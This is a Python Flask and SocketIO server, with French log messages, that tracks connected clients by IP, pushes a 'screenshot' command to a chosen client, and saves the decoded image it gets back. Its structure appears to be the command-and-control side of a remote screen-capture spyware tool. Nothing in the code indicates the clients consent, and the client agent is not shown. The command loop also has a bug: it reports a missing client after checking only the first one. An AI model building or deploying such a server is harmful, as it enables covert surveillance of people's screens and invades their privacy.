import base64
from flask import Flask, request, jsonify
from flask_socketio import SocketIO
import os

app = Flask(__name__)
socketio = SocketIO(app)
clients = {}


@app.route('/api/v1/command', methods=['POST'])
def handle_command():
    command_data = request.get_json()
    command = command_data.get('command')
    ip = command_data.get('ip')

    if command == 'screenshot':
        for sid, client_ip in clients.items():
            if client_ip == ip:
                socketio.emit('command', {'command': 'screenshot'}, room=sid)
                break
            else:
                return jsonify({'status': 'error', 'message': f'Client {ip} non trouvé.'}), 200
        return jsonify({'status': 'success', 'message': f'Commande de capture d\'écran envoyée au client {ip}.'}), 200

    else:
        return jsonify({'status': 'error', 'message': 'Commande non reconnue.'}), 400


@app.route('/api/v1/clients', methods=['GET'])
def get_clients():
    clients_info = [{'name': f'Client {i + 1}', 'ip': ip} for i, ip in enumerate(clients.values())]
    return jsonify({'status': 'success', 'clients': clients_info}), 200


@socketio.on('connect')
def handle_connect():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    clients[request.sid] = client_ip
    print(f"Nouvelle connexion de {client_ip}. Total des clients : {len(clients)}.")


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot = data.get('screenshot')
    screenshot_bytes = base64.b64decode(screenshot)
    with open('screenshot.png', 'wb') as f:
        f.write(screenshot_bytes)
    print("Capture d'écran reçue et enregistrée.")


@socketio.on('disconnect')
def handle_disconnect():
    clients.pop(request.sid)
    print(f"Déconnexion. Total des clients : {len(clients)}.")
    print(f"Clients restants : {clients}")


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
